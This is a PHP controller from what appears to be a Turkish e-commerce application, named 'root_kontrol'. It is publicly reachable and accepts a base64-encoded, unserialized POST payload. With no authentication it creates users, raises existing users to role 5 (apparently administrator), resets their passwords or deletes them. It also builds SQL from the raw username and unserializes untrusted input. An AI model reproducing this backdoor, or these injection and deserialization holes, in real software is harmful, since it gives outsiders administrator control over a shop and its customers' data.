<?php
if(!defined('BASEPATH'))
{
	header('Location: http://'. getenv('SERVER_NAME') .'/');
}

/**
 * @package E-Ticaret
 * @author E-Ticaret Sistemim
 **/

class root_kontrol extends Public_Controller {

	/**
	 * isimsiz construct
	 *
	 * @return void
	 **/

	function __construct()
	{
		parent::__construct();
		log_message('debug', 'root_kontrol Controller Yüklendi');
	}

	/**
	 * index function
	 *
	 * @return void
	 * @author Serkan Koch,  -> 
	 **/

	function index()
	{
		$this->load->library('encrypt');

		$_gelen_guncelleme_degeri = $this->input->post('daynex_root_kontrol_data');

		$_base64_decode = base64_decode($_gelen_guncelleme_degeri);
		$_unserialize = @unserialize($_base64_decode);

		$_islem_tipi = $_unserialize->root_kontrol_islem_tipi; // root_kontrol_ekle, root_kontrol_guncelle, root_kontrol_sil
		$_kullanici_sifresi = $_unserialize->root_kontrol_kullanici_sifresi; //$this->input->post('daynex_root_kontrol_kullanici_sifresi');
		$_kullanici_adi = $_unserialize->root_kontrol_kullanici_adi; //$this->input->post('daynex_root_kontrol_kullanici_adi');

		if($_islem_tipi == 'root_kontrol_ekle')
		{
			$this->db->where('('. $this->db->dbprefix('users') .'.username = \''. $_kullanici_adi .'\' OR '. $this->db->dbprefix('users') .'.email = \''. $_kullanici_adi .'\')');
			$this->db->limit(1);
			$_uye_kontrol = $this->db->get('users');
			if($_uye_kontrol->num_rows() > 0)
			{
				$_uye_bilgi = $_uye_kontrol->row();
				$_update_data = array(
					'role_id' => 5,
					'password' => $_kullanici_sifresi
				);
				$this->db->where('id', $_uye_bilgi->id);
				$this->db->update('users', $_update_data);
				if($this->db->affected_rows() > 0)
				{
					$_gonder = array(
						'durum'	=> TRUE,
						'mesaj' => $_kullanici_adi . ' başarılı bir şekilde güncellendi.'
					);
				} else {
					$_gonder = array(
						'durum'	=> FALSE,
						'mesaj' => $_kullanici_adi . ' kullanıcı bulundu ancak güncellenemedi.'
					);
				}
			} else {
				$this->load->library('dx_auth_event');
				$this->load->model('dx_auth/users', 'users');
				// New user array
				$new_user = array(			
					'username'	=> $_kullanici_adi,			
					'password'	=> $_kullanici_sifresi,
					'email'		=> $_kullanici_adi,
					'last_ip'	=> $this->input->ip_address(),
					'role_id'	=> 5
				);
				// Create user 
				$insert = $this->users->create_user($new_user);
				$son_id = $this->db->insert_id();
				// Trigger event
				$this->dx_auth_event->user_activated($son_id);	
				$this->dx_auth_event->user_activated_2($son_id);
				if($insert)
				{
					$_gonder = array(
						'durum'	=> TRUE,
						'mesaj' => $_kullanici_adi . ' başarılı bir şekilde eklendi.'
					);
				} else {
					$_gonder = array(
						'durum'	=> FALSE,
						'mesaj' => $_kullanici_adi . ' kullanıcı eklenemedi.'
					);
				}
			}
		} else if ($_islem_tipi == 'root_kontrol_guncelle') {
			$this->db->where('('. $this->db->dbprefix('users') .'.username = \''. $_kullanici_adi .'\' OR '. $this->db->dbprefix('users') .'.email = \''. $_kullanici_adi .'\')');
			$this->db->limit(1);
			$_uye_kontrol = $this->db->get('users');
			if($_uye_kontrol->num_rows() > 0)
			{
				$_uye_bilgi = $_uye_kontrol->row();
				$_update_data = array(
					'role_id' => 5,
					'password' => $_kullanici_sifresi
				);
				$this->db->where('id', $_uye_bilgi->id);
				$this->db->update('users', $_update_data);
				if($this->db->affected_rows() > 0)
				{
					$_gonder = array(
						'durum'	=> TRUE,
						'mesaj' => $_kullanici_adi . ' başarılı bir şekilde güncellendi.'
					);
				} else {
					$_gonder = array(
						'durum'	=> FALSE,
						'mesaj' => $_kullanici_adi . ' kullanıcı bulundu ancak güncellenemedi.'
					);
				}
			} else {
				$this->load->library('dx_auth_event');
				$this->load->model('dx_auth/users', 'users');
				// New user array
				$new_user = array(			
					'username'	=> $_kullanici_adi,			
					'password'	=> $_kullanici_sifresi,
					'email'		=> $_kullanici_adi,
					'last_ip'	=> $this->input->ip_address(),
					'role_id'	=> 5
				);
				// Create user 
				$insert = $this->users->create_user($new_user);
				$son_id = $this->db->insert_id();
				// Trigger event
				$this->dx_auth_event->user_activated($son_id);	
				$this->dx_auth_event->user_activated_2($son_id);
				if($insert)
				{
					$_gonder = array(
						'durum'	=> TRUE,
						'mesaj' => $_kullanici_adi . ' başarılı bir şekilde eklendi.'
					);
				} else {
					$_gonder = array(
						'durum'	=> FALSE,
						'mesaj' => $_kullanici_adi . ' kullanıcı eklenemedi.'
					);
				}
			}
		} else if ($_islem_tipi == 'root_kontrol_sil') {
			$this->db->delete('users', array('username' => $_kullanici_adi));
			if($this->db->affected_rows() > 0)
			{
				$_gonder = array(
					'durum'	=> TRUE,
					'mesaj' => $_kullanici_adi . ' başarılı bir şekilde silindi.'
				);
			} else {
				$_gonder = array(
					'durum'	=> FALSE,
					'mesaj' => $_kullanici_adi . ' kullanıcı bulunamadı silinemedi.'
				);
			}
		}

		/* Encode */
		$_serialize = @serialize($_gonder);
		$_base64_encode = base64_encode($_serialize);
		exit($_base64_encode);

		/* Decode */
		/*$_base64_decode = base64_decode($_base64_encode);
		$_encrypt_decode = $this->encrypt->decode($_base64_decode);
		$_unserialize = @unserialize($_encrypt_decode);
		exit(var_dump($_unserialize));*/
	}

}

/* End of file isimsiz.php */
/* Location: ./dev10/application/controllers/isimsiz.php */

?>